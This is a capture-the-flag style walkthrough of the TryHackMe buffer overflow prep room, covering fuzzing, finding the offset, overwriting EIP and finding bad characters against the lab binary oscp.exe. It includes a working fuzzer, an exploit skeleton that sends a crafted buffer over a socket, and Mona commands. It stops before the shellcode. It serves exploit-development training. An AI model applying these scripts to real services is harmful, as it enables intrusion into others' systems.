---
description: https://tryhackme.com/room/bufferoverflowprep (oscp.exe)
---

# OVERFLOW1

## Methodology

Remember, the buffer overflow methodology consists of several steps:

1. Spiking
   1. Method to find the vulnerable part of the program.
2. Fuzzing
   1. Sending a bunch of characters/messages to a program to break it.
3. Finding the offset
   1. At what point did we break it? This is called the offset.
4. Overwriting the EIP
   1. The offset will then be utilized to overwrite the EIP.
5. Finding bad characters
   1. We need to find out which characters are compatible with the shellcode and which characters are not.
6. Finding the correct module
   1. Looking for a DLL or something similar within a program that does not contain memory protections.
   2. Mona Modules + Immunity Debugger
7. Generate shellcode that leads to RCE

### You may be asking... why is it set up sequentially?

* The exploit scripts are set up in a step by step fashion due to the fact that&#x20;

### Getting Started

1. Deploy VM: `xfreerdp /u:admin /p:password /cert:ignore /v:10.10.253.98 /workarea`
2. Open Immunity Debugger as Admin
3. Load oscp.exe into the program
4. Run the program: Press F9

## "Playing"

* Here is where we see what the program is capable of
* Make note of what it can and can't do
* Is there anything that we can do out of the gate to break the program?
* Is there anything weird about it?
* One way we can do this is by connecting to the hosted program via netcat

### Netcat

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

* We notice that it is running on port 1337
* So, why not connect to it from Kali on port 1337?

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

### Mona Configuration

Place the following into the debugger window of Immunity:

```
!mona config -set workingfolder c:\mona\%p
```

## Fuzzing

* Create a file on Kali called <mark style="color:yellow;">00fuzzer.py</mark> with the following contents:

```
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.253.98"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

### What does this script do?

* This fuzzer will send an increasingly long string of "A's"
* If the fuzzer is able to crash the program with that set of strings, the fuzzer will exit with an error message
* <mark style="color:yellow;">MAKE A NOTE OF THE LARGEST NUMBER OF BYTES THAT WERE SENT</mark>

### Running the script

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

* We get an error message that the <mark style="color:yellow;">fuzzing crashed at 2000 bytes</mark>

## Crash Replication and Controlling EIP

* Create a file on Kali called <mark style="color:yellow;">01exploit.py</mark> with the following contents:

```
import socket

ip = "10.10.253.98"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

### msf\_pattern\_create

* We will now utilize a Metasploit module to generate a pattern that is a length of <mark style="color:yellow;">400 bytes LONGER than the string that crashed the program</mark>
* This is because the payload after that will still need to take up space in memory!
* We choose <mark style="color:yellow;">2400 bytes because the program crashed at 2000</mark>

Use the following command to generate your pattern:

```
msf-pattern_create -l 2400
```

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

* We will now take this long string of characters and place it in the payload section of <mark style="color:yellow;">01exploit.py</mark>
* Return to Immunity Debugger. Since the program has crashed, press the double arrow button to restart the program, now press the play button to start the program
* Now that the program is running and we have modified our script with the payload, it is time to run it

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

* If you made it this far, this is a great sign. Check Immunity and look at the bottom for the following:

<mark style="color:yellow;">Access Violation when executing \[6F43396E]</mark>

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption><p>EIP</p></figcaption></figure>

* We see in the CPU Registers window that EIP has been changed

### Find the distance from EIP

* There are 2 ways of doing this, <mark style="color:yellow;">with msf-pattern\_offset and Mona</mark>
* We will be using Mona here

Place the following into the debug window in Immunity:

```
!mona findmsp -distance 600
```

* Once we execute this, we are looking for the <mark style="color:yellow;">offset value</mark>

That can be seen in the following screenshot:

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

* Be sure to right-click > Appearance > Font -- and change the font size as needed
* We see that our <mark style="color:yellow;">offset value is 1978</mark>
* Go back to your <mark style="color:yellow;">01exploit.py</mark>&#x20;
* <mark style="color:yellow;">Add 1978 into the payload section. Remove the entire payload string and replace with ""</mark>
* Now, we are ready for the next step

## Finding Bad Characters

* These are characters from initial processing of the string by the server/app&#x20;
* When these characters are detected, it modified the buffer in someway and makes everything behave in weird ways
* This can be any character
* NOTE: <mark style="color:yellow;">\x00</mark> is always bad as it is a "<mark style="color:yellow;">nullbyte</mark>"

#### Generate a string of bad chars from \x01 to \xff with this script:

<mark style="color:yellow;">02badchars.py</mark>

```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

* Run the script
* Copy the string
* Go back and modify <mark style="color:yellow;">01exploit.py</mark>
* <mark style="color:yellow;">Place the string in the payload section</mark>
* <mark style="color:yellow;">Place four B's in the retn section as this will overwrite the EIP with four B's</mark>

Example:

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

* Once you have modified the script, go back to Immunity and restart the program and press play
* Go back to Kali and run the exploit

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

* In the CPU Register window you will see that the EIP has been overwritten with "42424242"

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>



































































